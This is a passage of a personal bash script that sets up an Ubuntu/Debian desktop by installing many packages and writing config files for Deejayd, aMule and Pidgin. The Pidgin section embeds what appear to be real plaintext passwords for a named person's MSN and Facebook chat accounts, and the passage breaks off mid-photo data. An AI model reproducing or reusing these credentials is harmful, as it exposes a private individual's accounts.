apt-get install -y --force-yes remastersys 1> /dev/null 2> $LOG

time_stop

}

f_remastersys

# Virtualbox
f_virtualbox () {

echo -n "  [*] Installing Virtualbox-4.0 ... "

timelapsed &

apt-get install -y --force-yes virtualbox dkms 1> /dev/null 2> $LOG

cd $home

echo ""
echo -n "          Downloading Virtualbox Extension Pack ... "
( axel http://download.virtualbox.org/virtualbox/4.1.6/Oracle_VM_VirtualBox_Extension_Pack-4.1.6-74713.vbox-extpack 1> /dev/null  ) &


echo ""
echo -n "          Downloading Virtualbox Guest Additions ..."
( axel http://download.virtualbox.org/virtualbox/4.1.6/VBoxGuestAdditions_4.1.6.iso 1> /dev/null 2> $home/errorinstall.log ) &


time_stop

}

f_virtualbox

cd $home

}

f_accessories_kde_buntu_debian () {

echo "[***] Accessories"

# Bum
f_bum () {

echo -n "  [*] Installing Bum ... "

timelapsed &

apt-get install -y --force-yes bum  1> /dev/null 2> $LOG

time_stop

}

f_bum

# Jockey (Driver Manager)
f_jockey_qt () {

echo  -n "  [*] Installing Jockey-qt ... "

apt-get install -y --force-yes jockey-qt  1> /dev/null 2> $LOG

time_stop

}

f_jockey_qt

# Isomaster
f_isomaster () {

echo -n "  [*] Installing Isomaster ... "

timelapsed &

apt-get install -y --force-yes isomaster 1> /dev/null 2> $LOG

time_stop

}

f_isomaster

# Meld file comparator
f_meld () {

echo -n "  [*] Installing Meld ..."

timelapsed &

apt-get install -y --force-yes meld 1> /dev/null 2> $LOG

time_stop

}

f_meld

# Partition Manager
f_partition () {

echo -n "  [*] Installing Partition Editor Software ... "

timelapsed &

apt-get install -y --force-yes gparted 1> /dev/null
apt-get install -y --force-yes parted xfsprogs reiserfsprogs reiser4progs dmraid 1> /dev/null 2> $LOG

time_stop

}

f_partition

# Synaptic
f_synaptic () {

echo -n "  [*] Installing Synaptic ... "

timelapsed &

apt-get install -y --force-yes synaptic 1> /dev/null 2> $LOG
time_stop

}

f_synaptic

# StopWatch
f_stopwatch () {

echo -n "  [*] Installing StopWatch ... "

timelapsed &

apt-get install -y --force-yes stopwatch 1> /dev/null 2> $LOG

time_stop

}

f_stopwatch

# Remastersys
f_remastersys () {

echo -n "  [*] Installing Remastersys ... "

timelapsed &

apt-get install -y --force-yes remastersys 1> /dev/null 2> $LOG
time_stop

}

f_remastersys

# Virtualbox
f_virtualbox () {

echo -n "  [*] Installing Virtualbox-4.0 ... "

timelapsed &

apt-get install -y --force-yes virtualbox-4.0 dkms 1> /dev/null  2> $LOG

cd $home

echo ""
echo -n "          Downloading Virtualbox Extension Pack ... "
( axel http://download.virtualbox.org/virtualbox/4.1.6/Oracle_VM_VirtualBox_Extension_Pack-4.1.6-74713.vbox-extpack 1> /dev/null  2> /dev/null ) &


echo ""
echo -n "          Downloading Virtualbox Guest Additions ..."
( axel http://download.virtualbox.org/virtualbox/4.1.6/VBoxGuestAdditions_4.1.6.iso 1> /dev/null 2> /dev/null ) &


time_stop

}

f_virtualbox

cd $home

}

f_volumeico () {

echo -n "  [*] Installing VolumeIcon ... "

timelapsed &

apt-get install -y --force-yes volumeicon 1> /dev/null 2> $LOG

time_stop

}



# Images Viewer
f_mirage_buntu_debian () {

echo -n "[*] Installing Mirage ... "

timelapsed &

apt-get install -y --force-yes mirage 1> /dev/null 2> $LOG

time_stop

}

f_kphotoalbum_buntu_debian () {

echo -n "[*] Installing KPhotoAlbum ... "

timelapsed &

apt-get install -y --force-yes kphotoalbum 1> /dev/null 2> $LOG

time_stop

}

# Gimp
f_gimp_buntu_debian () {

echo -n "[*] Installing Gimp ... "

timelapsed &

apt-get install -y --force-yes gimp 1> /dev/null 2> $LOG
apt-get install -y --force-yes gimp-data-extras 1> /dev/null 2> $LOG
apt-get install -y --force-yes gimp-gap 1> /dev/null 2> $LOG
apt-get install -y --force-yes gimp-gutenprint 1> /dev/null 2> $LOG
apt-get install -y --force-yes gimp-plugin-registry 1> /dev/null 2> $LOG
apt-get install -y --force-yes gimp-texturize 1> /dev/null 2> $LOG
apt-get install -y --force-yes gimp-ufraw 1> /dev/null 2> $LOG

time_stop

}



# Alsa
f_alsa_buntu_debian () {

echo -n "[*] Installing ALSA ... "

timelapsed &

apt-get install -y --force-yes alsa-base alsa-utils alsa-tools alsa-tools-gui alsa-oss alsamixergui 1> /dev/null 2> $LOG

time_stop

}

# PulseAudio
f_pulse_buntu_debian () {

echo -n "[*] Installing PulseAudio ... "

timelapsed &

apt-get install -y --force-yes pulseaudio paman 1> /dev/null 2> $LOG

time_stop

}

# Jack
f_jack_buntu_debian () {

echo -n "[*] Installing Jack ... "

timelapsed &

apt-get install -y --force-yes jackbeat jackd jackeq jack-rack jack-tools qjackctl jack-capture jack-keyboard jackmeter 1> /dev/null 2> $LOG

echo "      Install Jack Support For FlashPlugin ... "
cd /opt
apt-get install -y --force-yes libasound2-dev libjack-dev libsamplerate0-dev libssl-dev build-essential git-core autoconf automake libtool 1> /dev/null 2> $LOG
mkdir -p Jack
cd Jack
git clone git://repo.or.cz/libflashsupport-jack.git 1> /dev/null
cd libflashsupport-jack
bash bootstrap.sh 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd ..
cd ..
rm -f Jack
cd $home

time_stop

}


# Mplayer (Mplayer | Gnome-mplayer | Mencoder | Acidrip)
f_mplayer_buntu_debian () {

echo -n "[*] Installing Mplayer ... "

timelapsed &

apt-get install -y --force-yes mplayer 1> /dev/null 2> $LOG
apt-get install -y --force-yes gnome-mplayer 1> /dev/null 2> $LOG

cd $home
mkdir -p .mplayer
echo "$home/.mplayer" >> $file
cd $home/.mplayer
rm -f config
touch config

echo "
# Write your default config options here!

[gnome-mplayer]
" >> config

echo "ao=alsa
msglevel=all=5
vo=vdpau
" >> config

echo "$home/.mplayer/config" >> $file

cd $home

time_stop

f_mencoder () {

echo -n "[*] Installing Mencoder ... "

timelapsed &

apt-get install -y --force-yes mencoder 1> /dev/null 2> $LOG

time_stop

}

f_mencoder

f_acidrip () {

echo -n "[*] Installing AcidRip ... "

timelapsed &

apt-get install -y --force-yes acidrip 1> /dev/null 2> $LOG

time_stop

}

f_acidrip

}

# WinFF + Ffmpeg
f_winff_ffmpeg_buntu_debian () {

echo -n "[*] Installing WinFF + Ffmpeg ... "

timelapsed &

apt-get install -y --force-yes ffmpeg 1> /dev/null 2> $LOG
apt-get install -y --force-yes ffmpeg2theora 1> /dev/null 2> $LOG
apt-get install -y --force-yes winff 1> /dev/null 2> $LOG

time_stop

}

# HandBrake
f_handbrake_buntu_debian () { # subversion build-essential yasm autoconf libtool zlib1g-dev libbz2-dev intltool libglib2.0-dev libdbus-glib-1-dev libgtk2.0-dev libgudev-1.0-dev libwebkit-dev libnotify-dev libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev

cd /opt
echo -n "[*] Installing HandBrake ... "

timelapsed &

echo ""
echo -n "    - Installing HandBrake Dependencies ... "
apt-get install -y --force-yes subversion yasm build-essential autoconf libtool zlib1g-dev libbz2-dev intltool libglib2.0-dev libdbus-glib-1-dev libgtk2.0-dev libgudev-1.0-dev libwebkit-dev libnotify-dev libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev 1> /dev/null 2> $LOG

echo ""
echo -n "    - Downloading Subversion Source Code ... "
svn checkout svn://svn.handbrake.fr/HandBrake/trunk hb-trunk 1> /dev/null

echo ""
echo -n "    - Configuring ... "
cd hb-trunk
./configure 1> /dev/null
cd build

echo ""
echo -n "    - Compiling & Installing ... "
make 1> /dev/null
make install 1> /dev/null
cd ..
cd ..
rm -fr hb-trunk

cd $home

time_stop

}

# Deejayd (Xine + WebUI on localhost 6800)
f_deejayd_buntu_debian () {

echo -n "[*] Installing Deejayd ... "

timelapsed &

apt-get install -y --force-yes deejayd deejayd-webui deejayd-xine 1> /dev/null 2> $LOG

cd /etc
rm -f deejayd.conf
touch deejayd.conf
echo "/etc/deejayd.conf" >> $file

f_writing_deejayd.conf () {

echo "[general]
# error | info | debug
log = error

#   playlist, panel, webradio, video, dvd
activated_modes = playlist,panel,webradio,video,dvd

fullscreen = yes

replaygain = yes

# auto (1 xine - 2 gstreamer) | xine | gstreamer (no video)
media_backend = auto


[net]
enabled = yes
port = 6800
bind_addresses = all

[webui]
enabled = yes
port = 6880

bind_addresses = localhost
tmp_dir = /tmp/deejayd_webui
refresh = 0

[database]
# mysql | sqlite'
db_type = sqlite
# _db_name_ or path to database file if using sqlite
db_name = /var/lib/deejayd/deejayd.db
# _db_user_ : not used with sqlite
#db_user = zboub
# _db_password_ : not used with sqlite
#db_password = 'unbreakable_password'
# _db_host_ : set to empty string for localhost. Not used with sqlite
#db_host = localhost
# _db_port_ : set to empty string for default. Not used with sqlite
#db_port = 3300

[mediadb]
# var/lib/deejayd/music
music_directory =  /media/Expansionrive/Musica/Canzoni
# /var/lib/deejayd/video
video_directory =  /media/ExpansionDrive/Video
filesystem_charset = utf-8

[panel]
# panel_tags : set panel tags for panel mode
#   * genre,artist,album (default)
#   * artist,album
#   * genre,various_artist,album
#   * various_artist,album
# various_artist is equivalent to artist
panel_tags = genre,artist,album

[gstreamer]
# auto | alsa | oss | esd...
audio_output = auto

# Alsa Options
#alsa_card = hw:2

[xine]
# auto | alsa | oss...
audio_output = auto
software_mixer = false
# auto | Xv | xshm ..
video_output = auto
video_display= :0.0
osd_support = no
osd_font_size = 32
" >> deejayd.conf

}

f_writing_deejayd.conf
cd $home

time_stop

}


# Audio Player
f_amarok_buntu_debian () {

echo -n "[*] Installing Amarok ... "

timelapsed &

apt-get install -y --force-yes amarok 1> /dev/null 2> $LOG

time_stop

}

f_audacious_buntu_debian () {

echo -n "[*] Installing Audacious ... "

timelapsed &

apt-get install -y --force-yes audacious 1> /dev/null 2> $LOG
apt-get install -y --force-yes audacious-plugins 1> /dev/null 2> $LOG

time_stop

}

f_clementine_buntu_debian () {

echo -n "[*] Installing Clementine ... "

timelapsed &

apt-get install -y --force-yes clementine 1> /dev/null 2> $LOG

time_stop

}

f_exaile_buntu_debian () {

echo -n "[*] Installing Exaile ... "

timelapsed &

apt-get install -y --force-yes exaile 1> /dev/null 2> $LOG
apt-get install -y --force-yes exaile-plugin-textinfo 1> /dev/null 2> $LOG
apt-get install -y --force-yes exaile-plugin-ipod 1> /dev/null 2> $LOG

time_stop

}

f_rhythmbox_buntu_debian () {

echo -n "[*] Installing Rhythmox ... "

timelapsed &

apt-get install -y --force-yes rhythmbox 1> /dev/null 2> $LOG

time_stop

}


# CD DVD Burner
f_brasero_buntu_debian () {

echo -n "[*] Installing Brasero ... "

timelapsed &

apt-get install -y --force-yes brasero 1> /dev/null 2> $LOG
apt-get install -y --force-yes brasero-cdrkit 1> /dev/null 2> $LOG

time_stop

}

f_k3b_buntu_debian () {

echo -n "[*] Installing K3b ... "

timelapsed &

apt-get install -y --force-yes k3b 1> /dev/null 2> $LOG
apt-get install -y --force-yes libk3b6-extracodecs 1> /dev/null 2> $LOG
apt-get install -y --force-yes k3b-extrathemes 1> /dev/null 2> $LOG

time_stop

}

f_xfburn_buntu_debian () {

echo -n "[*] Installing Xfburn ... "

timelapsed &

apt-get install -y --force-yes xfburn 1> /dev/null 2> $LOG

time_stop

}


# Multimedia Software
f_multimedia_software_buntu_debian () {

echo "[***] Installing Multimedia Software ... "

# Audacity
f_audacity () {

echo -n "  [*] Installing Audacity ... "

timelapsed &

apt-get install -y --force-yes audacity 1> /dev/null 2> $LOG

time_stop

}

f_audacity

# OsdLyrics
f_osdlyrics () {

echo -n "  [*] Installing Osd-Lyrics ... "

timelapsed &

git clone git://github.com/osdlyrics/osdlyrics.git 1> /dev/null
cd osdlyrics

apt-get install autoconf automake libtool intltool libdbus-glib-1-dev libcurl-openssl-dev libnotify-dev libsqulite3-dev 1> /dev/null 2> $LOG

aclocal 1> /dev/null
autoheader 1> /dev/null
autoconf 1> /dev/null
automake --add-missing 1> /dev/null
./configure --disable-mpd --disable-xmms2 1> /dev/null
make 1> /dev/null
make install 1> /dev/null

cd ..
rm -fr osdlyrics
cd $home

time_stop

}

f_osdlyrics

# EasyTag
f_easytag () {

echo -n "  [*] Installing EasyTag ... "

timelapsed &

apt-get install -y --force-yes easytag 1> /dev/null 2> $LOG

time_stop

}

f_easytag

# Gnac
f_gnac () {

echo -n "  [*] Installing EasyTag ... "

timelapsed &

apt-get install -y --force-yes gnac 1> /dev/null 2> $LOG

time_stop

}

f_gnac

# Mixxx
f_mixxx () {

echo -n "  [*] Installing Mixxx ... "

timelapsed &

apt-get install -y --force-yes mixxx 1> /dev/null 2> $LOG

time_stop

}

f_mixxx

# VideoEditors (Pitivi | Kino | StopMotion)
f_video_editors () {

echo " [**] VideoEditors"

# PiTiVi
f_pitivi () {

echo -n "  [*] Installing PiTiVi ... "

timelapsed &

apt-get install -y --force-yes pitivi 1> /dev/null 2> $LOG

time_stop

}

f_pitivi

# Kino
f_kino () {

echo -n "  [*] Installing Kino ... "

timelapsed &

apt-get install -y --force-yes kino 1> /dev/null 2> $LOG

time_stop

}

f_kino

# StopMotion
f_stopmotion () {

echo -n "  [*] Installing StopMotion ... "

timelapsed &

apt-get install -y --force-yes stopmotion 1> /dev/null 2> $LOG

time_stop

}

f_stopmotion

}

f_video_editors

}

# Installa Ultramixer
# axel http://www.mix-software.com/_releases/UltraMixer/UltraMixer-2.4.3-linux.jar 1> /dev/null
# java -jar UltraMixer-2.3.2-linux.jar
#  rm -f UltraMixer-2.4.3-linux.jar


# Dj Software
f_dj_buntu_debian () {

echo " [**] DeeJay Software"

cd $home

# Sf2 Sound
f_sound_sf2 () {

echo -n "  [*] Sf2 Sounds ... "

timelapsed &

echo "      Downloading Unison.sf2.gz ... "
axel ftp://ftp.personalcopy.net/pub/Unison.sf2.gz 1> /dev/null

echo "      Downloading PC51f.sf2.gz ... "
axel ftp://ftp.personalcopy.net/pub/PC51f.sf2.gz 1> /dev/null

echo "      GUnzip Unison.sf2.gz ... "
gunzip Unison.sf2.gz 1> /dev/null

echo "      GUnzip PC51f.sf2.gz ... "
gunzip PC51f.sf2.gz 1> /dev/null

echo "      Moving Sound to /usr/share/sounds/sf2 ... "
mv Unison.sf2 /usr/share/sounds/sf2/ 1> /dev/null
mv PC51f.sf2 /usr/share/sounds/sf2/ 1> /dev/null

rm *.gzip 1> /dev/null
cd $home

time_stop

}

f_sound sf2

# Ardour
f_ardour () {

echo -n "  [*] Installing Ardour ... "

timelapsed &

apt-get install -y --force-yes ardour 1> /dev/null 2> $LOG

time_stop

}

f_ardour

# FluidSynth
f_fluidsynth () {

echo -n "  [*] Installing FluidSynth ... "

timelapsed &

apt-get install -y --force-yes fluidsynth 1> /dev/null 2> $LOG

time_stop

}

f_fluidsynth

# Hexter
f_hexter () {

echo -n "  [*] Installing Hexter ... "

timelapsed &

apt-get install -y --force-yes hexter 1> /dev/null 2> $LOG

time_stop

}

f_hexter

# Hydrogen
f_hydrogen () {

echo -n "  [*] Installing Hydrogen ... "

timelapsed &

apt-get install -y --force-yes hydrogen hydrogen-drumkits 1> /dev/null 2> $LOG

time_stop

}

f_hydrogen

# Meterbridge
f_meterbridge () {

echo -n "  [*] Installing Meterbridge ... "

timelapsed &

apt-get install -y --force-yes meterbridge 1> /dev/null 2> $LOG

time_stop

}

f_meterbridge

# Patchage
f_patchage () {

echo -n "  [*] Installing Patchage ... "

timelapsed &

apt-get install -y --force-yes patchage 1> /dev/null 2> $LOG

time_stop

}

f_patchage

# Rosegarden
f_rosegarden () {

echo -n "  [*] Installing Rosegarden ... "

timelapsed &

apt-get install -y --force-yes rosegarden 1> /dev/null 2> $LOG

time_stop

}

f_rosegarden

# Sooper Looper
f_sooper_looper () {

echo -n "  [*] Installing Sooper Looper ... "

timelapsed &

apt-get install -y --force-yes sooperlooper 1> /dev/null 2> $LOG

time_stop

}

f_sooper_looper

# Timidity
f_timidity () {

echo -n "  [*] Installing Timidity ... "

timelapsed &

apt-get install -y --force-yes timidity 1> /dev/null 2> $LOG

time_stop

}

f_timidity

# Xsynth-Dss
f_xsynth_dss () {

echo -n "  [*] Installing Xsynth-Dss ... "

timelapsed &

apt-get install -y --force-yes xsynth-dss 1> /dev/null 2> $LOG

time_stop

}

f_xsynth_dss

echo "

@audio - rtprio 99
@audio - memlock unlimited
@audio - nice -10

" >> /etc/security/limits.conf

cd $home

}



# Internet
f_internet_software_buntu_debian () {

echo "[***] Internet Software"

# Skype
f_skype () {

echo -n "  [*] Installing Skype ... "

timelapsed &

apt-get install -y --force-yes skype 1> /dev/null 2> $LOG

time_stop

}

f_skype

# Amule
f_amule () {

echo -n "  [*] Installing Amule ... "

timelapsed &

apt-get install -y --force-yes amule 1> /dev/null 2> $LOG

echo ""
echo -n "        - Configuring Amule ... "
mkdir -p $home/.aMule
cd $home/.aMule
echo "$home/.aMule" >> $file
rm -f amule.conf
touch amule.conf

f_writing_amule () {

echo "
[Statistics]
TotalDownloadedBytes=5482169021
TotalUploadedBytes=1903489358023
MaxClientVersions=0
[eMule]
AppVersion=2.2.6
Nick=darkeffe
NewVersionCheck=1
StartupMinimized=1
ConfirmExit=1
EnableTrayIcon=1
MinToTray=1
ToolTipDelay=1
VideoPlayer=mplayer
VideoPreviewBackupped=0
MaxDownload=2000
MaxUpload=10
SlotAllocation=2
Port=4662
UDPPort=4672
UDPDisable=0
Address=
MaxSourcesPerFile=300
MaxConnections=500
ConnectToED2K=1
ConnectToKad=1
UPnPEnabled=1
UPnPTCPPort=50000
Autoconnect=1
Reconnect=1
ShowOverhead=0
RemoveDeadServer=1
DeadServerRetry=3
Serverlist=0
AddServerListFromServer=0
AddServerListFromClient=0
Scoresystem=1
SmartIdCheck=1
SafeServerConnect=0
AutoConnectStaticOnly=0
ManualHighPrio=0
ICH=1
AICHTrust=0
AddNewFilesPaused=0
DAPPref=1
PreviewPrio=0
UAPPref=1
FullChunkTransfers=1
StartNextFile=0
StartNextFileSameCat=0
CheckDiskspace=1
MinFreeDiskSpace=1
AllocateFullFile=0
IncomingDir=/media/amule
TempDir=/media/amule
ShareHiddenFiles=0
StatGraphsInterval=3
StatsAverageMinutes=5
VariousStatisticsMaxValue=100
statsInterval=30
DownloadCapacity=30000
UploadCapacity=10
MaxConnectionsPerFiveSeconds=20
FileBufferSizePref=16
QueueSizePref=50
ServerKeepAliveTimeout=0
3DDepth=5
AutoSortDownloads=0
ShowInfoOnCatTabs=1
ShowRatesOnTitle=0
VerticalToolbar=0
ShowPartFileNumber=0
SeeShare=2
IPFilterURL=
IPFilterAutoLoad=1
FilterLevel=127
FilterLanIPs=1
ParanoidFiltering=1
IPFilterSystem=0
OnlineSignature=0
OnlineSignatureUpdate=5
OSDirectory=$home/.aMule/
FilterMessages=1
FilterAllMessages=0
MessagesFromFriendsOnly=0
MessageFromValidSourcesOnly=1
FilterWordMessages=0
MessageFilter=
FilterComments=0
CommentFilter=
Language=
SplitterbarPosition=75
YourHostname=
DateTimeFormat=%A, %x, %X
AllcatType=0
ShowAllNotCats=0
SmartIdState=1
DropSlowSources=0
KadNodesUrl=http://emule-inside.net/nodes.dat
Ed2kServersUrl=http://gruk.org/server.met.gz
StatColor0=4194304
StatColor1=16761024
StatColor2=8454016
StatColor3=53760
StatColor4=32768
StatColor5=8421631
StatColor6=200
StatColor7=140
StatColor8=16750230
StatColor9=12583104
StatColor10=8454143
StatColor11=0
StatColor12=8454016
StatColor13=53760
StatColor14=32768
TableOrderingServer=0 0,
TableWidthsServer=150,140,25,150,25,40,45,60,40,40,80
TableOrderingDownload=5 4096, 0 0,
TableWidthsDownload=260,60,65,65,65,170,50,55,70,164,220,220
TableOrderingUploads=9 0, 0 0,
TableWidthsUploads=150,275,100,60,65,60,60,110,100,100,100
TableOrderingShared=0 0,
TableWidthsShared=250,100,50,70,220,100,100,120,100,120,120,220
TableOrderingSearch=0 0,
TableWidthsSearch=500,100,50,65,280
[Browser]
DefaultBrowser=0
CustomBrowserString=
OpenPageInTab=1
[ExternalConnect]
UseSrcSeeds=0
ShowPercent=1
ShowProgressBar=1
AcceptExternalConnections=0
ECPassword=
ECAddress=
ECPort=4712
UPnPECEnabled=1
IpFilterClients=1
IpFilterServers=1
UseSecIdent=1
[SkinGUIOptions]
UseSkinFiles=0
Skin=System:xfce.zip
[Razor_Preferences]
FastED2KLinksHandler=1
SRV_SPLITTER_POS=410
[WebServer]
Enabled=1
Port=4711
UPnPWebServerEnabled=1
WebUPnPTCPPort=49999
PageRefreshTime=120
UseGzip=0
UseLowRightsUser=0
Password=8b23c339372dbd1ad4aa4653b1772b56
PasswordLow=
Template=default
[Obfuscation]
IsClientCryptLayerSupported=1
IsCryptLayerRequested=1
IsClientCryptLayerRequired=0
CryptoPaddingLenght=254
CryptoKadUDPKey=1673456202
[Proxy]
ProxyEnableProxy=0
ProxyType=0
ProxyName=
ProxyPort=1080
ProxyEnablePassword=0
ProxyUser=
ProxyPassword=
[UserEvents]
[UserEvents/DownloadCompleted]
CoreEnabled=0
CoreCommand=
GUIEnabled=0
GUICommand=
[UserEvents/NewChatSession]
CoreEnabled=0
CoreCommand=
GUIEnabled=0
GUICommand=
[UserEvents/OutOfDiskSpace]
CoreEnabled=0
CoreCommand=
GUIEnabled=0
GUICommand=
[UserEvents/ErrorOnCompletion]
CoreEnabled=0
CoreCommand=
GUIEnabled=0
GUICommand=
[GUI]
[GUI/TransferWnd]
Splitter=396
ShowClientList=1
" >> amule.conf

}

f_writing_amule
echo "$home/.aMule/amule.conf" >> $file

cd $home

time_stop

}

f_amule

# Amsn
f_amsn () {

echo -n "  [*] Installing Amsn ... "

timelapsed &

cd /opt

echo ""
echo -n  "        Installing Amsn Dependencies... "
apt-get install -y --force-yes subversion cvs libgstreamer0.10-0 gstreamer0.10-plugins-base gstreamer0.10-plugins-good gstreamer0.10-plugins-bad gstreamer0.10-plugins-farsight gstreamer0.10-tools gstreamer0.10-alsa -f -y 1> /dev/null 2> $LOG
apt-get build-dep amsn gstreamer0.10-plugins-farsight -f -y --force-yes 1> /dev/null 2> $LOG

echo ""
echo -n  "        Downloading Subversion Source Code of Amsn ... "
svn co https://amsn.svn.sourceforge.net/svnroot/amsn/trunk/amsn amsn 1> /dev/null

cd amsn
echo ""
echo -n "         Downloading & Installing LibNice ... "
axel http://nice.freedesktop.org/releases/libnice-0.0.6.tar.gz 1> /dev/null
tar xzvf libnice-0.0.6.tar.gz 1> /dev/null
cd libnice-0.0.6
./configure --prefix=/usr --disable-gtk-doc 1> /dev/null
make 1> /dev/null
make install 1> /dev/null

echo ""
echo -n "         Downloading & Installing FarSight ... "
axel http://farsight.freedesktop.org/releases/farsight2/farsight2-0.0.7.tar.gz 1> /dev/null
tar xzvf farsight2-0.0.7.tar.gz 1> /dev/null
cd farsight2-0.0.7
./configure --prefix=/usr --disable-python --disable-gtk-doc 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd ..

echo ""
echo -n "         Compiling Amsn ... "
make clean 1> /dev/null
make uninstall 1> /dev/null
./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null

echo ""
echo -n "         Downloading Subversion Amsn-Extras & Copyng It To $home/.amsn ... "
svn co https://amsn.svn.sourceforge.net/svnroot/amsn/trunk/amsn-extras amsn-extras 1> /dev/null
cd amsn-extras
mkdir -p $home/.amsn
echo "$home/.amsn" >> $file
cp -r ./* $home/.amsn/
cd ..

echo ""
echo -n "         CVS Downloading & Copyng Tknd ... "
cvs -z3 -d:pserver:anonymous@tkdnd.cvs.sourceforge.net:/cvsroot/tkdnd co -P tkdnd/lib 1> /dev/null
cd tkdnd 1> /dev/null
mkdir -p /usr/share/amsn/utils/tkdnd 1> /dev/null
cp lib/*tcl /usr/share/amsn/utils/tkdnd/ 1> /dev/null
cp lib/Linux/libtkdnd1.0.so /usr/share/amsn/utils/tkdnd/ 1> /dev/null
cd ..
cd /usr/local/bin 1> /dev/null
ln -s wish8.5 wish
ln -s tclsh8.5 tclsh
cd $home

cd /opt
rm -fr amsn

cd $home

time_stop

}

f_amsn

# Pidgin
f_pidgin () {

echo -n "  [*] Installing Pidgin ... "

timelapsed &

apt-get install -y --force-yes pidgin 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-extprefs 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-themes 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-encryption 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-opengp 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-privacy-please 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-twitter 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-sipe 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-nateon 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-facebookchat 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-plugin-pack 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-skype 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-musictracker 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-guifications 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-otr 1> /dev/null 2> $LOG
apt-get install -y --force-yes pidgin-microblog 1> /dev/null 2> $LOG

cd $home

mkdir -p .purple
echo "$home/.purple/" >> $file

cd .purple

mkdir -p certificates
echo "$home/.purple/certificates" >> $file

cd certificates
mkdir -p x509
echo "$home/.purple/certificates/x509" >> $file

cd ..
cd ..

mkdir -p smileys
echo "$home/.purple/smileys" >> $file

rm -f accounts.xml
touch accounts.xml
echo "$home/.purple/accounts.xml" >> $file

f_writing_pidgin_accounts () {

echo "<?xml version='1.0' encoding='UTF-8' ?>

<account version='1.0'>
	<account>
		<protocol>prpl-msn</protocol>
		<name>francesco.1993@libero.it</name>
		<password>chicco17693</password>
		<statuses>
			<status type='available' name='Presente' active='true'>
				<attributes/>
			</status>
			<status type='away' name='Assente' active='false'>
				<attributes/>
			</status>
			<status type='brb' name='Torno subito' active='false'>
				<attributes/>
			</status>
			<status type='busy' name='Occupato' active='false'>
				<attributes/>
			</status>
			<status type='phone' name='Al telefono' active='false'>
				<attributes/>
			</status>
			<status type='lunch' name='A pranzo' active='false'>
				<attributes/>
			</status>
			<status type='invisible' name='Invisibile' active='false'>
				<attributes/>
			</status>
			<status type='offline' name='Non connesso' active='false'>
				<attributes/>
			</status>
		</statuses>
		<settings>
			<setting name='use-global-buddyicon' type='bool'>1</setting>
			<setting name='http_method_server' type='string'>gateway.messenger.hotmail.com</setting>
			<setting name='endpoint-name' type='string'>Pidgin</setting>
			<setting name='custom_smileys' type='bool'>1</setting>
			<setting name='port' type='int'>1863</setting>
			<setting name='mpop' type='bool'>1</setting>
			<setting name='direct_connect' type='bool'>1</setting>
			<setting name='check-mail' type='bool'>0</setting>
			<setting name='http_method' type='bool'>0</setting>
			<setting name='ablastChange' type='string'>2012-04-20T09:50:07.353-07:00</setting>
			<setting name='server' type='string'>messenger.hotmail.com</setting>
			<setting name='CLLastChange' type='string'>2012-01-09T12:09:31.77-08:00</setting>
			<setting name='DynamicItemLastChanged' type='string'>0001-01-01T00:00:00</setting>
		</settings>
		<settings ui='gtk-gaim'>
			<setting name='auto-login' type='bool'>1</setting>
		</settings>
		<current_error/>
	</account>
	<account>
		<protocol>prpl-jabber</protocol>
		<name>darkeffe93@chat.facebook.com/</name>
		<password>dark!face_book!effe</password>
		<statuses>
			<status type='available' name='Online' active='true'>
				<attributes/>
			</status>
			<status type='offline' name='Offline' active='false'>
				<attributes/>
			</status>
		</statuses>
		<userinfo>&lt;vCard xmlns=&apos;vcard-temp&apos;&gt;&lt;FN&gt;Francesco Saporito&lt;/FN&gt;&lt;PHOTO&gt;&lt;TYPE&gt;image/jpeg&lt;/TYPE&gt;&lt;BINVAL&gt;/9j/4AAQSkZJRgABAQAAAQABAAD//gA7Q1JFQVRPUjogZ2QtanBlZyB2MS4wICh1c2luZyBJSk
cgSlBFRyB2ODApLCBxdWFsaXR5ID0gOTUK/9sAQwACAQEBAQECAQEBAgICAgIEAwICAgIFBAQD
BAYFBgYGBQYGBgcJCAYHCQcGBggLCAkKCgoKCgYICwwLCgwJCgoK/9sAQwECAgICAgIFAwMFCg
cGBwoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoK/8AA
EQgAMgAyAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAA
IBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYX
GBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiY
qSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq
8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAw
QHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBka
JicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJ
WWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX2
9/j5+v/aAAwDAQACEQMRAD8A/RX/AIKmeG7vwb42+G/7Znhp54rb4U+I0svFFxDcMWh0+/KRSb
IWKrvUOpyGU4kUk4AI9j8caZa/Df4IzePJrax13xJqZs7PTY7iV59P1O4vbiGC1jcszbo2eSIF
